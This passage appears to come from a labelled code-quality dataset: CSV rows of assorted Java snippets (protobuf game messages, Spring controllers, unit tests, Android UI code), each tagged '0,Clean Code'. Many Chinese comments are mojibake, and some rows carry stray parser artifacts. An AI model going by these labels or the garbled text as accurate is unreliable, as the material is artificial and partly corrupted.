 * @param oldCategoryId:鏃х绫籭d
 * @param newCategoryId:鏂扮绫籭d
 * @return
 */
@PostMapping(""/oaExamineField/updateFieldCategoryId"") Result<Boolean> updateFieldCategoryId(@RequestParam(""newCategoryId"") Long newCategoryId,@RequestParam(""oldCategoryId"") Long oldCategoryId);
",0,Clean Code
"@ParameterizedTest @ValueSource(strings={""\n\n"",""\n \n"","" \n\n"",""\n\n "","" \n \n "",""\r\n\r\n""}) void should_split_paragraph_into_sentences_if_it_does_not_fit_into_segment(String separator){
  int maxSegmentSize=50;
  String firstParagraph=""This is a first paragraph."";
  assertThat(firstParagraph).hasSizeLessThan(maxSegmentSize);
  String firstSentenceOfSecondParagraph=""This is a fist sentence of a second paragraph."";
  assertThat(firstSentenceOfSecondParagraph).hasSizeLessThan(maxSegmentSize);
  String secondSentenceOfSecondParagraph=""This is a second sentence of a second paragraph."";
  assertThat(secondSentenceOfSecondParagraph).hasSizeLessThan(maxSegmentSize);
  String secondParagraph=firstSentenceOfSecondParagraph + "" "" + secondSentenceOfSecondParagraph;
  assertThat(secondParagraph).hasSizeGreaterThan(maxSegmentSize);
  String thirdParagraph=""This is a third paragraph."";
  assertThat(thirdParagraph).hasSizeLessThan(maxSegmentSize);
  Document document=Document.from(format("" %s %s %s %s %s "",firstParagraph,separator,secondParagraph,separator,thirdParagraph),metadata(""document"",""0""));
  DocumentSplitter splitter=new DocumentByParagraphSplitter(maxSegmentSize,0);
  List<TextSegment> segments=splitter.split(document);
  segments.forEach(segment -> assertThat(segment.text().length()).isLessThanOrEqualTo(maxSegmentSize));
  assertThat(segments).containsExactly(textSegment(firstParagraph,metadata(""index"",""0"").add(""document"",""0"")),textSegment(firstSentenceOfSecondParagraph,metadata(""index"",""1"").add(""document"",""0"")),textSegment(secondSentenceOfSecondParagraph,metadata(""index"",""2"").add(""document"",""0"")),textSegment(thirdParagraph,metadata(""index"",""3"").add(""document"",""0"")));
}",0,Clean Code
"public static ExchangeHcoinScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ExchangeHcoinScRsp(),data).checkInitialized();
}
public static ExchangeHcoinScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ExchangeHcoinScRsp(),input).checkInitialized();
}
public static ExchangeHcoinScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ExchangeHcoinScRsp(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 1;</code>
 * @return this
 */
public TakeMailAttachmentScRsp clearRetcode(){
  bitField0_&=~0x00000001;
  retcode=0;
  return this;
}",0,Clean Code
"public ContainsExpressionContext containsExpression(){
  return getRuleContext(ContainsExpressionContext.class,0);
}
public List<ContainsExpressionContext> containsExpression(){
  return getRuleContexts(ContainsExpressionContext.class);
}
public ContainsExpressionContext containsExpression(int i){
  return getRuleContext(ContainsExpressionContext.class,i);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@45044565",0,Clean Code
"default void init(){
}
",0,Clean Code
"@Override public PromoteEquipmentCsReq clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  itemCostList.clearQuick();
  return this;
}",0,Clean Code
"/** 
 * <code>repeated .EntityMotion entity_motion_list = 11;</code>
 * @param value the entityMotionList to add
 * @return this
 */
public SceneEntityMoveCsReq addEntityMotionList(final EntityMotionOuterClass.EntityMotion value){
  bitField0_|=0x00000002;
  entityMotionList.add(value);
  return this;
}",0,Clean Code
"@Bean(SWEEPER_EXECUTOR_NAME) public Executor sweeperExecutor(ConductorProperties properties){
  if (properties.getSweeperThreadCount() <= 0) {
    throw new IllegalStateException(""conductor.app.sweeper-thread-count must be greater than 0."");
  }
  ThreadFactory threadFactory=new BasicThreadFactory.Builder().namingPattern(""sweeper-thread-%d"").build();
  return Executors.newFixedThreadPool(properties.getSweeperThreadCount(),threadFactory);
}",0,Clean Code
"/** 
 * 鑾峰彇鏂囦欢鍚�
 */
public static String getFileName(String template,GenTable genTable){
  String fileName="""";
  String packageName=genTable.getPackageName();
  String moduleName=genTable.getModuleName();
  String className=genTable.getClassName();
  String businessName=genTable.getBusinessName();
  String javaPath=PROJECT_PATH + ""/"" + StringUtils.replace(packageName,""."",""/"");
  String mybatisPath=MYBATIS_PATH + ""/"" + moduleName;
  String vuePath=""vue"";
  if (template.contains(""domain.java.vm"")) {
    fileName=StringUtils.format(""{}/domain/{}.java"",javaPath,className);
  }
  if (template.contains(""sub-domain.java.vm"") && StringUtils.equals(GenConstants.TPL_SUB,genTable.getTplCategory())) {
    fileName=StringUtils.format(""{}/domain/{}.java"",javaPath,genTable.getSubTable().getClassName());
  }
 else   if (template.contains(""mapper.java.vm"")) {
    fileName=StringUtils.format(""{}/mapper/{}Mapper.java"",javaPath,className);
  }
 else   if (template.contains(""service.java.vm"")) {
    fileName=StringUtils.format(""{}/service/I{}Service.java"",javaPath,className);
  }
 else   if (template.contains(""serviceImpl.java.vm"")) {
    fileName=StringUtils.format(""{}/service/impl/{}ServiceImpl.java"",javaPath,className);
  }
 else   if (template.contains(""controller.java.vm"")) {
    fileName=StringUtils.format(""{}/controller/{}Controller.java"",javaPath,className);
  }
 else   if (template.contains(""mapper.xml.vm"")) {
    fileName=StringUtils.format(""{}/{}Mapper.xml"",mybatisPath,className);
  }
 else   if (template.contains(""sql.vm"")) {
    fileName=businessName + ""Menu.sql"";
  }
 else   if (template.contains(""api.js.vm"")) {
    fileName=StringUtils.format(""{}/api/{}/{}.js"",vuePath,moduleName,businessName);
  }
 else   if (template.contains(""index.vue.vm"")) {
    fileName=StringUtils.format(""{}/views/{}/{}/index.vue"",vuePath,moduleName,businessName);
  }
 else   if (template.contains(""index-tree.vue.vm"")) {
    fileName=StringUtils.format(""{}/views/{}/{}/index.vue"",vuePath,moduleName,businessName);
  }
  return fileName;
}
",0,Clean Code
"@Override protected void onDismiss(boolean canShowKeyboard){
  forwardingPreviewView=null;
  checkShowBlur(true);
  if (messagePreviewParams != null) {
    if (replyingQuote == null) {
      replyingQuote=messagePreviewParams.quote;
    }
    if (messagePreviewParams.quote == null) {
      replyingQuote=null;
    }
    if (replyingQuote != null) {
      replyingQuote.outdated=false;
      replyingQuote.start=messagePreviewParams.quoteStart;
      replyingQuote.end=messagePreviewParams.quoteEnd;
      replyingQuote.update();
      if (fieldPanelShown == 2) {
        showFieldPanelForReplyQuote(replyingMessageObject,replyingQuote);
      }
    }
 else {
      ArrayList<MessageObject> selectedMessage=new ArrayList<>();
      if (messagePreviewParams.forwardMessages != null) {
        messagePreviewParams.forwardMessages.getSelectedMessages(selectedMessage);
      }
      fallbackFieldPanel();
    }
  }
  forbidForwardingWithDismiss=false;
  if (keyboardWasVisible && canShowKeyboard) {
    AndroidUtilities.runOnUIThread(() -> {
      if (chatActivityEnterView != null) {
        chatActivityEnterView.openKeyboard();
      }
    }
,50);
    keyboardWasVisible=false;
  }
  AndroidUtilities.requestAdjustResize(getParentActivity(),classGuid);
}",0,Clean Code
"/** 
 * <pre> PDBKKNJFBAJ FDAJEIDNMAK = 9; </pre> <code>optional uint32 retcode = 3;</code>
 * @param value the retcode to set
 * @return this
 */
public StartRogueScRsp setRetcode(final int value){
  bitField0_|=0x00000001;
  retcode=value;
  return this;
}",0,Clean Code
"@Override public List<OperationLog> deleteByIds(List<Long> candidateIds){
  List<OperationLog> operationLogs=new ArrayList<>();
  listByIds(candidateIds).forEach(candidate -> {
    Content content=candidateActionRecordService.addOrDeleteRecord(HrmActionBehaviorEnum.DELETE,candidate.getCandidateId());
    OperationLog operationLog=new OperationLog();
    operationLog.setOperationObject(candidate.getCandidateId(),candidate.getCandidateName());
    operationLog.setOperationInfo(content.getDetail());
    operationLogs.add(operationLog);
  }
);
  removeByIds(candidateIds);
  recruitInterviewService.lambdaUpdate().in(HrmRecruitInterview::getCandidateId,candidateIds).remove();
  return operationLogs;
}
",0,Clean Code
"private void initialize(long presentationTimeUs) throws InitializationException {
  releasingConditionVariable.block();
  audioTrack=Assertions.checkNotNull(configuration).buildAudioTrack(tunneling,audioAttributes,audioSessionId);
  int audioSessionId=audioTrack.getAudioSessionId();
  if (enablePreV21AudioSessionWorkaround) {
    if (Util.SDK_INT < 21) {
      if (keepSessionIdAudioTrack != null && audioSessionId != keepSessionIdAudioTrack.getAudioSessionId()) {
        releaseKeepSessionIdAudioTrack();
      }
      if (keepSessionIdAudioTrack == null) {
        keepSessionIdAudioTrack=initializeKeepSessionIdAudioTrack(audioSessionId);
      }
    }
  }
  if (this.audioSessionId != audioSessionId) {
    this.audioSessionId=audioSessionId;
    if (listener != null) {
      listener.onAudioSessionId(audioSessionId);
    }
  }
  applyPlaybackParameters(playbackParameters,presentationTimeUs);
  audioTrackPositionTracker.setAudioTrack(audioTrack,configuration.outputEncoding,configuration.outputPcmFrameSize,configuration.bufferSize,applyDolbyPassthroughQuirk());
  setVolumeInternal();
  if (auxEffectInfo.effectId != AuxEffectInfo.NO_AUX_EFFECT_ID) {
    audioTrack.attachAuxEffect(auxEffectInfo.effectId);
    audioTrack.setAuxEffectSendLevel(auxEffectInfo.sendLevel);
  }
}",0,Clean Code
"public RawFunction(final IAddress address,final String name,final EFunctionType type,final ESide side){
  super(address,-1,0,0,Color.WHITE,Color.BLACK,false,true);
  this.name=checkNotNull(name);
  this.type=checkNotNull(type);
  this.side=checkNotNull(side);
}",0,Clean Code
"@Override public RogueAchivedMiracleInfo clone(){
  return new RogueAchivedMiracleInfo().copyFrom(this);
}
",0,Clean Code
"public static float lvqDotProduct(MemorySegmentVectorFloat vector,LocallyAdaptiveVectorQuantization.PackedVector packedVector,float vectorSum){
  if (HAS_AVX512) {
    return lvqDotProduct512(vector,packedVector,vectorSum);
  }
 else {
    return lvqDotProduct256(vector,packedVector,vectorSum);
  }
}",0,Clean Code
"public String toString(){
  return ""GProQQMsgListGuild{guildId="" + this.guildId + "",topTimestamp=""+ this.topTimestamp+ "",guildName=""+ this.guildName+ "",avatarSeq=""+ this.avatarSeq+ "",}"";
}
",0,Clean Code
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  int width=MeasureSpec.getSize(widthMeasureSpec);
  if (deleteImageView != null) {
    deleteImageView.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  if (moveImageView != null) {
    moveImageView.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  if (textView2 != null) {
    textView2.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(24),MeasureSpec.EXACTLY));
  }
  if (checkBox != null) {
    checkBox.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  int right;
  if (textView2 == null) {
    right=42;
  }
 else   if (deleteImageView == null) {
    right=70;
  }
 else {
    right=122;
  }
  textView.measure(MeasureSpec.makeMeasureSpec(width - getPaddingLeft() - getPaddingRight()- AndroidUtilities.dp(right),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(0,MeasureSpec.UNSPECIFIED));
  int h=textView.getMeasuredHeight();
  setMeasuredDimension(width,Math.max(AndroidUtilities.dp(50),textView.getMeasuredHeight()) + (needDivider ? 1 : 0));
  if (textView2 != null && !alwaysShowText2) {
    textView2.setAlpha(h >= AndroidUtilities.dp(52) ? 1.0f : 0.0f);
  }
}",0,Clean Code
"@PostMapping(""/updateSchedule"") @ApiOperation(""淇敼鐩爣杩涘害"") public Result updateSchedule(@RequestBody UpdateScheduleBO updateScheduleBO){
  employeeAppraisalService.updateSchedule(updateScheduleBO);
  return Result.ok();
}
",0,Clean Code
"/** 
 * 绉婚櫎骞跺彇鍑虹涓�涓厓绱�
 * @param key key
 * @return value
 */
@SuppressWarnings(""unchecked"") @Override public <T>T getSet(String key){
  return (T)redisTemplate.opsForSet().pop(appendKeyPrefix(key));
}
",0,Clean Code
"ConductorObservableQueue(String queueName,QueueDAO queueDAO,ConductorProperties properties,Scheduler scheduler){
  this.queueName=queueName;
  this.queueDAO=queueDAO;
  this.pollTimeMS=properties.getEventQueuePollInterval().toMillis();
  this.pollCount=properties.getEventQueuePollCount();
  this.longPollTimeout=(int)properties.getEventQueueLongPollTimeout().toMillis();
  this.scheduler=scheduler;
}
",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 4;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableLineup()} if you want to modify it.
 * @return internal storage object for reading
 */
public LineupInfoOuterClass.LineupInfo getLineup(){
  return lineup;
}",0,Clean Code
"public void setLatitude(Double latitude){
  Latitude=latitude;
}
",0,Clean Code
"private char[] readLatinChars(MemoryBuffer buffer,int numBytes){
  char[] chars=new char[numBytes];
  buffer.checkReadableBytes(numBytes);
  byte[] targetArray=buffer.getHeapMemory();
  if (targetArray != null) {
    int srcIndex=buffer._unsafeHeapReaderIndex();
    for (int i=0; i < numBytes; i++) {
      chars[i]=(char)(targetArray[srcIndex++] & 0xff);
    }
    buffer._increaseReaderIndexUnsafe(numBytes);
  }
 else {
    byte[] byteArray=getByteArray(numBytes);
    buffer.readBytes(byteArray,0,numBytes);
    for (int i=0; i < numBytes; i++) {
      chars[i]=(char)(byteArray[i] & 0xff);
    }
  }
  return chars;
}",0,Clean Code
"@Test void should_find_with_min_score(){
  String firstId=randomUUID();
  Embedding firstEmbedding=embeddingModel.embed(""firstEmbedText"").content();
  embeddingStore.add(firstId,firstEmbedding);
  String secondId=randomUUID();
  Embedding secondEmbedding=embeddingModel.embed(""secondEmbedText"").content();
  embeddingStore.add(secondId,secondEmbedding);
  List<EmbeddingMatch<TextSegment>> relevant=embeddingStore.findRelevant(firstEmbedding,10);
  assertThat(relevant).hasSize(2);
  EmbeddingMatch<TextSegment> firstMatch=relevant.get(0);
  assertThat(firstMatch.score()).isCloseTo(1,withPercentage(1));
  assertThat(firstMatch.embeddingId()).isEqualTo(firstId);
  EmbeddingMatch<TextSegment> secondMatch=relevant.get(1);
  assertThat(secondMatch.score()).isBetween(0d,1d);
  assertThat(secondMatch.embeddingId()).isEqualTo(secondId);
  List<EmbeddingMatch<TextSegment>> relevant2=embeddingStore.findRelevant(firstEmbedding,10,secondMatch.score() - 0.01);
  assertThat(relevant2).hasSize(2);
  assertThat(relevant2.get(0).embeddingId()).isEqualTo(firstId);
  assertThat(relevant2.get(1).embeddingId()).isEqualTo(secondId);
  List<EmbeddingMatch<TextSegment>> relevant3=embeddingStore.findRelevant(firstEmbedding,10,secondMatch.score());
  assertThat(relevant3).hasSize(2);
  assertThat(relevant3.get(0).embeddingId()).isEqualTo(firstId);
  assertThat(relevant3.get(1).embeddingId()).isEqualTo(secondId);
  List<EmbeddingMatch<TextSegment>> relevant4=embeddingStore.findRelevant(firstEmbedding,10,secondMatch.score() + 0.01);
  assertThat(relevant4).hasSize(1);
  assertThat(relevant4.get(0).embeddingId()).isEqualTo(firstId);
  checkEntitiesCreated(relevant.size(),iterator -> {
    iterator.forEachRemaining(node -> {
      if (node.get(DEFAULT_ID_PROP).asString().equals(firstMatch.embeddingId())) {
        checkDefaultProps(firstEmbedding,firstMatch,node);
      }
 else {
        checkDefaultProps(secondEmbedding,secondMatch,node);
      }
    }
);
  }
);
}",0,Clean Code
"/** 
 * <code>optional uint64 add_time_ms = 8;</code>
 * @param value the addTimeMs to set
 * @return this
 */
public BuffInfo setAddTimeMs(final long value){
  bitField0_|=0x00000001;
  addTimeMs=value;
  return this;
}",0,Clean Code
"@Override public CfAccountExample getExampleByQuery(CfAccountQuery cfAccountQuery){
  CfAccountExample cfAccountExample=new CfAccountExample();
  CfAccountExample.Criteria criteria=cfAccountExample.createCriteria();
  if (cfAccountQuery.getId() != null) {
    criteria.andIdEqualTo(cfAccountQuery.getId());
  }
  if (StringUtils.isNotEmpty(cfAccountQuery.getUid())) {
    criteria.andUidEqualTo(cfAccountQuery.getUid());
  }
  if (StringUtils.isNotEmpty(cfAccountQuery.getScoreType())) {
    criteria.andScoreTypeEqualTo(cfAccountQuery.getScoreType());
  }
  if (cfAccountQuery.getType() != null) {
    criteria.andTypeEqualTo(cfAccountQuery.getType());
  }
  if (cfAccountQuery.getMinBalance() != null) {
    criteria.andBalanceGreaterThanOrEqualTo(cfAccountQuery.getMinBalance());
  }
  if (cfAccountQuery.getMaxBalance() != null) {
    criteria.andBalanceLessThanOrEqualTo(cfAccountQuery.getMaxBalance());
  }
  if (cfAccountQuery.getMinFreeze() != null) {
    criteria.andFreezeGreaterThanOrEqualTo(cfAccountQuery.getMinFreeze());
  }
  if (cfAccountQuery.getMaxFreeze() != null) {
    criteria.andFreezeLessThanOrEqualTo(cfAccountQuery.getMaxFreeze());
  }
  if (cfAccountQuery.getMinCreateTime() != null) {
    criteria.andCreateTimeGreaterThanOrEqualTo(cfAccountQuery.getMinCreateTime());
  }
  if (cfAccountQuery.getMaxCreateTime() != null) {
    criteria.andCreateTimeLessThanOrEqualTo(cfAccountQuery.getMaxCreateTime());
  }
  if (StringUtils.isNotEmpty(cfAccountQuery.getOrderBy())) {
    cfAccountExample.setOrderByClause(cfAccountQuery.getOrderBy());
  }
  if (cfAccountQuery.getPage() != null && cfAccountQuery.getSize() != null) {
    PageHelper.startPage(cfAccountQuery.getPage(),cfAccountQuery.getSize());
  }
  return cfAccountExample;
}
",0,Clean Code
"@Override public FlowVO createFlowInfo(Map<String,Object> map,Flow flow,List<UserInfo> userInfos,Long ownerUserId){
  UserInfo userInfo;
  if (ObjectUtil.isNotNull(ownerUserId)) {
    userInfo=searUserInfo(userInfos,ownerUserId);
  }
 else {
    userInfo=searUserInfo(userInfos,UserUtil.getUserId());
  }
  FlowVO flowVO=new FlowVO();
  flowVO.setFlowId(flow.getFlowId());
  flowVO.setFlowName(flow.getFlowName());
  flowVO.setContent(flow.getContent());
  flowVO.setFlowType(flow.getFlowType());
  flowVO.setType(flow.getType());
  flowVO.setSort(flow.getPriority());
  Map<String,FlowExamineContinuousSuperior> continuousSuperiorMap=(Map<String,FlowExamineContinuousSuperior>)map.get(ExamineTypeEnum.CONTINUOUS_SUPERIOR.name());
  FlowExamineContinuousSuperior continuousSuperior=continuousSuperiorMap.get(flow.getFlowId().toString());
  FlowVO.FlowExamineData examineData=new FlowVO.FlowExamineData();
  examineData.setExamineType(ExamineTypeEnum.CONTINUOUS_SUPERIOR.getType());
  examineData.setType(continuousSuperior.getType());
  examineData.setRoleId(continuousSuperior.getRoleId());
  examineData.setParentLevel(continuousSuperior.getMaxLevel());
  examineData.setExamineErrorHandling(flow.getExamineErrorHandling());
  List<Long> userIds=new ArrayList<>();
  if (ObjectUtil.isNotNull(userInfo.getParentId()) && userInfo.getParentId() > 0) {
    userIds=queryUser(userInfos,continuousSuperior.getMaxLevel(),continuousSuperior.getRoleId(),userInfo.getParentId());
  }
  userIds=handleUserList(userIds,flow.getFlowMetadataId());
  examineData.setUserList(searchUsers(userInfos,userIds));
  flowVO.setData(JSON.parseObject(JSON.toJSONString(examineData)));
  return flowVO;
}",0,Clean Code
"@Override public RogueCommonPendingAction copyFrom(final RogueCommonPendingAction other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    uniqueId=other.uniqueId;
    rogueAction.copyFrom(other.rogueAction);
  }
  return this;
}",0,Clean Code
"@Test void test_sanitize(){
  assertThat(sanitize(""``"")).isEqualTo(""````"");
  assertThat(sanitize(""\\u0060\\u0060\\u0060"")).isEqualTo(""``````"");
  assertThat(sanitize(""Hello`"")).isEqualTo(""`Hello```"");
  assertThat(sanitize(""Hi````there"")).isEqualTo(""`Hi````there`"");
  assertThat(sanitize(""Hi`````there"")).isEqualTo(""`Hi``````there`"");
  assertThat(sanitize(""`a`b`c`"")).isEqualTo(""```a``b``c```"");
  assertThat(sanitize(""\u0060a`b`c\u0060d\u0060"")).isEqualTo(""```a``b``c``d```"");
  assertThat(sanitize(""\\u0060a`b`c\\u0060d\\u0060"")).isEqualTo(""```a``b``c``d```"");
  assertThat(sanitize(""Foo \\u0060"")).isEqualTo(""`Foo ```"");
  assertThat(sanitize(""ABC"")).isEqualTo(""ABC"");
  assertThat(sanitize(""A C"")).isEqualTo(""`A C`"");
  assertThat(sanitize(""A` C"")).isEqualTo(""`A`` C`"");
  assertThat(sanitize(""ALabel"")).isEqualTo(""ALabel"");
  assertThat(sanitize(""A Label"")).isEqualTo(""`A Label`"");
  assertThat(sanitize(""A `Label"")).isEqualTo(""`A ``Label`"");
  assertThat(sanitize(""`A `Label"")).isEqualTo(""```A ``Label`"");
  assertThat(sanitize(""`A `Label"")).isEqualTo(""```A ``Label`"");
  assertThat(sanitize(""Emoticon 鈿★笍sanitize"")).isEqualTo(""`Emoticon 鈿★笍sanitize`"");
  assertThat(sanitize(""Foo \u0060"")).isEqualTo(""`Foo ```"");
  assertThat(sanitize(""Foo\\`bar"")).isEqualTo(""`Foo``bar`"");
  assertThat(sanitize(""Foo\\\\`bar"")).isEqualTo(""`Foo\\``bar`"");
  assertThat(sanitize(""釕�"")).isEqualTo(""釕�"");
  assertThat(sanitize(""鈿★笍"")).isEqualTo(""`鈿★笍`"");
  assertThat(sanitize(""\\u0075\\u1456"")).isEqualTo(""u釕�"");
  assertThat(sanitize(""\u1456"")).isEqualTo(""釕�"");
  assertThat(sanitize(""something\\u005C\\u00751456"")).isEqualTo(""`something\\u005C\\u00751456`"");
  assertThat(sanitize(""\\u005Cu0060"")).isEqualTo(""`\\u005C\\u00750060`"");
  assertThat(sanitize(""\\u005C\\u0060"")).isEqualTo(""`\\```"");
  assertThat(sanitize(""x\\y"")).isEqualTo(""`x\\y`"");
  assertThat(sanitize(""x\\\\y"")).isEqualTo(""`x\\y`"");
  assertThat(sanitize(""x\\\\\\\\y"")).isEqualTo(""`x\\\\y`"");
  assertThat(sanitize(""x\\`y"")).isEqualTo(""`x``y`"");
  assertThat(sanitize(""Foo \\u0060"")).isEqualTo(""`Foo ```"");
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof GetRogueTalentInfoScRsp)) {
    return false;
  }
  GetRogueTalentInfoScRsp other=(GetRogueTalentInfoScRsp)o;
  return bitField0_ == other.bitField0_ && (!hasRetcode() || retcode == other.retcode) && (!hasTalentInfo() || talentInfo.equals(other.talentInfo));
}",0,Clean Code
"protected boolean isShiftPressed(){
  return m_shift;
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code MazeMapData}
 */
public static MazeMapData newInstance(){
  return new MazeMapData();
}
",0,Clean Code
"@Override public WebElement findElement(AndroidElementInfo elementInfo){
  WebElement elementFound;
  if (!Strings.isNullOrEmpty(elementInfo.getXpath())) {
    elementFound=driverController.findElementByXPath(elementInfo.getXpath());
    if (elementFound != null) {
      return elementFound;
    }
  }
  if (!Strings.isNullOrEmpty(elementInfo.getContentDesc())) {
    elementFound=driverController.findElementByAccessibilityId(elementInfo.getContentDesc());
    if (elementFound != null) {
      return elementFound;
    }
  }
  if (!Strings.isNullOrEmpty(elementInfo.getResourceId())) {
    elementFound=driverController.findElementById(elementInfo.getResourceId());
    if (elementFound != null) {
      return elementFound;
    }
  }
  if (!Strings.isNullOrEmpty(elementInfo.getText())) {
    elementFound=driverController.findElementByText(elementInfo.getText());
    if (elementFound != null) {
      return elementFound;
    }
  }
  return null;
}
",0,Clean Code
"public boolean isAdmin(){
  return (this.dwAdditionalFlag & 1) == 1 || (this.dwCmdUinUinFlag & 1) == 1;
}",0,Clean Code
"@Test public void testDiversityFallback(){
  similarityFunction=VectorSimilarityFunction.EUCLIDEAN;
  VectorFloat<?>[] values={vectorTypeSupport.createFloatVector(new float[]{0,0,0}),vectorTypeSupport.createFloatVector(new float[]{0,10,0}),vectorTypeSupport.createFloatVector(new float[]{0,0,20}),vectorTypeSupport.createFloatVector(new float[]{10,0,0}),vectorTypeSupport.createFloatVector(new float[]{0,4,0})};
  MockVectorValues vectors=vectorValues(values);
  GraphIndexBuilder builder=new GraphIndexBuilder(vectors,similarityFunction,2,10,1.0f,1.0f);
  builder.addGraphNode(0,vectors.getVector(0));
  builder.addGraphNode(1,vectors.getVector(1));
  builder.addGraphNode(2,vectors.getVector(2));
  assertNeighbors(builder.graph,0,1,2);
  assertNeighbors(builder.graph,1,0);
  assertNeighbors(builder.graph,2,0);
  builder.addGraphNode(3,vectors.getVector(3));
  assertNeighbors(builder.graph,0,1,3);
  assertNeighbors(builder.graph,1,0);
  assertNeighbors(builder.graph,2,0);
  assertNeighbors(builder.graph,3,0);
}",0,Clean Code
"/** 
 * Parse an entry's header information from a header buffer.
 * @param header The tar entry header buffer to get information from.
 * @throws IllegalArgumentException if any of the numeric fields have an invalid format
 */
public void parseTarHeader(final byte[] header){
  try {
    parseTarHeader(header,TarUtils.DEFAULT_ENCODING);
  }
 catch (  final IOException ex) {
    try {
      parseTarHeader(header,TarUtils.DEFAULT_ENCODING,true,false);
    }
 catch (    final IOException ex2) {
      throw new RuntimeException(ex2);
    }
  }
}
/** 
 * Parse an entry's header information from a header buffer.
 * @param header   The tar entry header buffer to get information from.
 * @param encoding encoding to use for file names
 * @throws IllegalArgumentException if any of the numeric fields have an invalid format
 * @throws IOException              on error
 * @since 1.4
 */
public void parseTarHeader(final byte[] header,final ZipEncoding encoding) throws IOException {
  parseTarHeader(header,encoding,false,false);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1b6b6404",0,Clean Code
"int getGuildUnNotifyFlag();
",0,Clean Code
"private AvatarExpUpCsReq(){
}
",0,Clean Code
"/** 
 * 鏌ヨ鐢ㄦ埛id鏍规嵁鐢ㄦ埛鍚嶅拰鍏徃id
 * @param username  :鐢ㄦ埛鍚嶅瓧
 * @param companyId :鍏徃id
 * @return
 */
@Override public Result<Long> queryUserIdByUserNameAndCompanyId(String username,Long companyId){
  return Result.ok(0L);
}",0,Clean Code
"@PostMapping(""/save"") @ApiOperation(""鏂板缓鎵ц鍣�"") public ReturnT<String> save(@RequestBody JobGroup jobGroup){
  if (jobGroup.getAppName() == null || jobGroup.getAppName().trim().length() == 0) {
    return new ReturnT<String>(500,(I18nUtil.getString(""system_please_input"") + ""AppName""));
  }
  if (jobGroup.getAppName().length() < 4 || jobGroup.getAppName().length() > 64) {
    return new ReturnT<String>(500,I18nUtil.getString(""jobgroup_field_appName_length""));
  }
  if (jobGroup.getTitle() == null || jobGroup.getTitle().trim().length() == 0) {
    return new ReturnT<String>(500,(I18nUtil.getString(""system_please_input"") + I18nUtil.getString(""jobgroup_field_title"")));
  }
  if (jobGroup.getAddressType() != 0) {
    if (jobGroup.getAddressList() == null || jobGroup.getAddressList().trim().length() == 0) {
      return new ReturnT<String>(500,I18nUtil.getString(""jobgroup_field_addressType_limit""));
    }
    String[] addresses=jobGroup.getAddressList().split("","");
    for (    String item : addresses) {
      if (item == null || item.trim().length() == 0) {
        return new ReturnT<String>(500,I18nUtil.getString(""jobgroup_field_registryList_invalid""));
      }
    }
  }
  int ret=jobGroupMapper.save(jobGroup);
  return (ret > 0) ? ReturnT.SUCCESS : ReturnT.FAIL;
}",0,Clean Code
"@Override public void handleException(Throwable err,Ukcp ukcp){
}
",0,Clean Code
"/** 
 * 鍒犻櫎鏂囦欢澶逛互鍙婄洰褰曚笅鐨勬枃浠�
 * @param filePath 琚垹闄ょ洰褰曠殑鏂囦欢璺緞
 * @return 鐩綍鍒犻櫎鎴愬姛杩斿洖true锛屽惁鍒欒繑鍥瀎alse
 */
public static boolean deleteDirectory(String filePath){
  boolean flag;
  if (filePath == null || filePath.length() == 0)   return false;
  if (!filePath.endsWith(File.separator)) {
    filePath=filePath + File.separator;
  }
  File dirFile=new File(filePath);
  try {
    if (!dirFile.exists() || !dirFile.isDirectory()) {
      return false;
    }
    flag=true;
    File[] files=dirFile.listFiles();
    for (    File file : files) {
      if (file.isFile()) {
        flag=deleteFile(file.getAbsolutePath());
      }
 else {
        flag=deleteDirectory(file.getAbsolutePath());
      }
      if (!flag)       break;
    }
    if (!flag)     return false;
  }
 catch (  Exception e) {
    return false;
  }
  return dirFile.delete();
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code SellItemCsReq}
 */
public static SellItemCsReq newInstance(){
  return new SellItemCsReq();
}
",0,Clean Code
"public Tool(Function function){
  this.type=ToolType.FUNCTION;
  this.function=function;
  this.retrieval=null;
  this.webSearch=null;
}
",0,Clean Code
"public List<OaTask> build(){
  ArrayList<OaTask> tasks=new ArrayList<>();
  if (FlowConstant.COMPLETE_MODE_OR.equals(this.completeMode)) {
    OaTask build=buildPrimeTask();
    tasks.add(build);
    if (!CollectionUtils.isEmpty(this.users)) {
      if (this.users.size() > 1) {
        this.linkUsers.addAll(this.users);
      }
 else {
        build.setAssignee(this.users.iterator().next().getId());
      }
    }
    ArrayList<OaTaskUserLink> userLinks=new ArrayList<>();
    if (!CollectionUtils.isEmpty(this.linkUsers)) {
      userLinks.addAll(this.linkUsers.stream().map(u -> {
        OaTaskUserLink link=new OaTaskUserLink();
        link.setUserLinkType(FlowConstant.USER_LINK_USERS);
        link.setLinkId(u.getId());
        link.setLinkName(u.getName());
        return link;
      }
).collect(Collectors.toList()));
    }
    if (!CollectionUtils.isEmpty(this.linkRoles)) {
